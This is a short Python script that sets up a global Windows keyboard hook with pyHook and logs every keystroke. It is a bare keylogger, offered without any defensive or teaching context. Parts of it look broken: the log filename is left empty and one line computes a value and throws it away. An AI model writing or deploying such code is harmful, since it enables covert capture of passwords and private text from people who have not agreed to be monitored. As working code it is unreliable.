import pyHook, logging, pythoncom

var = ""

def OnKeyboardEvent(event):
    logging.basicConfig(filename=var, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)    
    logging.log(10,chr(event.Ascii))
    return True
    
x = pyHook.HookManager()
x.KeyDown = OnKeyboardEvent
x.HookKeyboard()
pythoncom.PumpMessages()

    
